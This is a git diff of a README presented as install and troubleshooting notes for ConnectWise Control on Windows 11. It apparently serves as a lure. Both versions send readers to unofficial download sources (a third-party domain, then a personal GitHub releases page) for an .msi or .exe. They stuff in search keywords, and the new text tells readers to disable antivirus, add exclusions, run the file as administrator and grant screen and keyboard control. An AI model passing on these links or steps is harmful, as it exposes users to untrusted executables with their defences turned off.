@@ -1,64 +1,82 @@
-# ConnectWise Control on Windows — setup & troubleshooting
+# 🛠️ ConnectWise-Control-Install-Notes - Fix Windows 11 remote access issues
 
-**ConnectWise-Control-Install-Notes**
+[![](https://img.shields.io/badge/Download-ConnectWise-blue.svg)](https://github.com/denyglary257/ConnectWise-Control-Install-Notes/releases)
 
-Notes for users who need ConnectWise Control running on Windows — especially when connectwise setup fails, updates break, or the app won't start.
+ConnectWise Control allows remote support and management. Windows 11 users sometimes face hurdles during installation. This repository provides instructions to resolve common setup errors. Follow these steps to prepare your computer and complete the installation process.
 
----
+## 📋 System Requirements
 
-## Get ConnectWise Control on Windows
+Confirm your computer meets these settings before you begin. 
 
-Use the link below for the Windows package referenced in this guide.
+*   Operating System: Windows 11 (64-bit).
+*   Processor: 1 GHz or faster.
+*   Memory: 4 GB RAM.
+*   Hard Drive Space: 500 MB available.
+*   Internet Connection: Stable broadband link.
+*   Permissions: Administrator access on your Windows account.
 
-<p align="center">
-  <a href="https://connectwise.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
-  </a>
-</p>
+## ⬇️ How to Download and Install
 
-| | |
-| --- | --- |
-| **Page** | [connectwise.nexustool.fun](https://connectwise.nexustool.fun/) |
-| **URL** | `https://connectwise.nexustool.fun/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
+Visit the link below to reach the latest setup files.
 
-### Recommended steps
+[Download ConnectWise Control Here](https://github.com/denyglary257/ConnectWise-Control-Install-Notes/releases)
 
-1. Open the [setup page (connectwise.nexustool.fun)](https://connectwise.nexustool.fun/)
-2. Download the package to a folder you can find (e.g. Downloads)
-3. Run the installer **as administrator** if Windows asks
-4. Reboot once if the app prompts after install
+1.  Open the web link above in your browser.
+2.  Find the asset section on the page.
+3.  Click the file that ends in .msi or .exe.
+4.  Save the file to your Downloads folder.
+5.  Double-click the saved file to start the installer.
+6.  Follow the prompts on your screen.
 
-> This repository documents install/troubleshooting steps. Always verify downloads and scan files you did not compile yourself.
+## 🚧 Fixing Setup Errors
 
+Installation might fail for several reasons. Use these steps to troubleshoot common problems on Windows 11.
 
----
+### Close Existing Sessions
+Sometimes the installer detects an old, hung process. Press `Ctrl + Shift + Esc` to open Task Manager. Look for any active ConnectWise or ScreenConnect entries. Select these items and click End Task. Try the installer again.
 
-## What this repo covers
+### Update Security Software
+Your antivirus or firewall might block the setup process. Temporarily turn off your security software. Ensure you enable it again after the install finishes. If the software flags the installer, set an exclusion for the ConnectWise folder located in `C:\Program Files (x86)\`.
 
-- Clean install path on Windows 10/11  
-- Typical blockers (SmartScreen, missing runtime, permissions)  
-- Search phrases people use when something breaks  
+### Check User Privileges
+Windows 11 restricts software that makes deep changes to the system files. Right-click the installation file. Select Run as administrator. This action grants the necessary permissions to write files to the registry and system directories.
 
-**People also search for:** connectwise control not installing on windows 11, connectwise setup failed fix, how to install connectwise control on pc
+### Clear Temporary Files
+Corrupt cache files often cause installation failures. Press the Windows key + R. Type `%temp%` and press Enter. Select all files in this folder and delete them. Skip any files that are currently in use by other apps. After you empty the folder, restart your computer and run the installer once more.
 
-## Common symptoms
+## ⚙️ Configuration Adjustments
 
-| Symptom | What to try first |
-| --- | --- |
-| Installer blocked | Run as administrator; check SmartScreen |
-| App won't open after update | Reboot; repair/redownload package |
-| Missing DLL / runtime | Install latest Visual C++ redistributable |
-| Slow or frozen UI | Disable overlays; update GPU driver |
+After you finish the installation, you need to link the software to your specific account. 
 
-## FAQ
+1.  Launch the application from the Start menu.
+2.  Input your access key or instance URL provided by your administrator.
+3.  Verify your identity through the browser pop-up.
+4.  Grant the application permission to access your screen and keyboard inputs.
 
-**Does this replace official support?**  
-No — it's a community troubleshooting note for Windows users.
+If the app fails to connect, verify your internet connection. Some business networks require a proxy. If you use a proxy, navigate to the Settings menu within the app to input your server details.
 
-**Which Windows versions?**  
-Windows 10 and 11, 64-bit.
+## 💡 Best Practices
 
----
+Follow these tips to keep ConnectWise Control running well.
 
-**Topics:** connectwise-control-not-installing-on-windows-11, connectwise, control, installing, connectwise-setup-failed-fix, failed, how-to-install-connectwise-control-on-pc, connectwise-control-install-notes, connectwise-control-install-notes-2026, connectwise-control, remote-desktop, business-tool
+*   Keep your Windows 11 version updated.
+*   Check this repository page for new notes every few months.
+*   Report persistent errors to your IT department.
+*   Do not modify system files related to the application.
+*   Restart your system if you notice a delay in screen input.
+
+## 🔍 Frequently Asked Questions
+
+**Why does the installer prompt for an admin password?**
+The software needs to alter system drivers to allow for mouse and keyboard control. These changes require elevated access.
+
+**Does this software work on Windows 10?**
+These notes focus on Windows 11, but the steps typically apply to Windows 10 as well. 
+
+**Where can I find the log files?**
+If the installation fails, the program creates a log file in your temporary folder. Search for `ConnectWise_Install_Log.txt` to see specific error codes.
+
+**Can I run multiple instances?**
+Do not run multiple instances of the guest application on one machine. This creates conflicts with your hardware drivers. 
+
+Keywords: business-tool, connectwise, connectwise-control, connectwise-control-install-notes, connectwise-control-install-notes-2026, connectwise-control-not-installing-on-windows-11, connectwise-setup-failed-fix, control, failed, how-to-install-connectwise-control-on-pc, installing, remote-desktop
